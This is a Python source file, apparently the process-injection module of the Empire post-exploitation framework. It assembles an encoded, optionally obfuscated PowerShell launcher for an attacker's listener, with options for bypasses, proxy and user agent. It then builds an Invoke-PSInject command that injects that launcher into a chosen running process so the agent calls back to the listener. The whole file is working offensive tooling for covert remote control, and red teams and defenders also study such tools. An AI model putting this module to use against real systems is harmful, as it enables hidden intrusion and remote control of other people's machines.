from typing import Dict

from empire.server.core.module_models import EmpireModule
from empire.server.utils.module_util import handle_error_message


class Module:
    @staticmethod
    def generate(
        main_menu,
        module: EmpireModule,
        params: Dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # staging options
        listener_name = params["Listener"]
        proc_id = params["ProcId"].strip()
        proc_name = params["ProcName"].strip()
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]
        if (params["Obfuscate"]).lower() == "true":
            launcher_obfuscate = True
        else:
            launcher_obfuscate = False
        launcher_obfuscate_command = params["ObfuscateCommand"]

        if proc_id == "" and proc_name == "":
            return handle_error_message(
                "[!] Either ProcID or ProcName must be specified."
            )

        # read in the common module source code
        script, err = main_menu.modulesv2.get_module_source(
            module_name=module.script_path,
            obfuscate=obfuscate,
            obfuscate_command=obfuscation_command,
        )

        if err:
            return handle_error_message(err)

        script_end = ""
        if not main_menu.listeners.is_listener_valid(listener_name):
            # not a valid listener, return nothing for the script
            return handle_error_message("[!] Invalid listener: %s" % (listener_name))
        else:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = main_menu.stagers.generate_launcher(
                listenerName=listener_name,
                language="powershell",
                obfuscate=launcher_obfuscate,
                obfuscation_command=launcher_obfuscate_command,
                encode=True,
                userAgent=user_agent,
                proxy=proxy,
                proxyCreds=proxy_creds,
                bypasses=params["Bypasses"],
            )
            if launcher == "":
                return handle_error_message("[!] Error in launcher generation.")
            elif len(launcher) > 5952:
                return handle_error_message("[!] Launcher string is too long!")
            else:
                launcher_code = launcher.split(" ")[-1]

                if proc_id != "":
                    script_end += "Invoke-PSInject -ProcID {} -PoshCode {}".format(
                        proc_id,
                        launcher_code,
                    )
                else:
                    script_end += "Invoke-PSInject -ProcName {} -PoshCode {}".format(
                        proc_name,
                        launcher_code,
                    )

        script = main_menu.modulesv2.finalize_module(
            script=script,
            script_end=script_end,
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
        return script
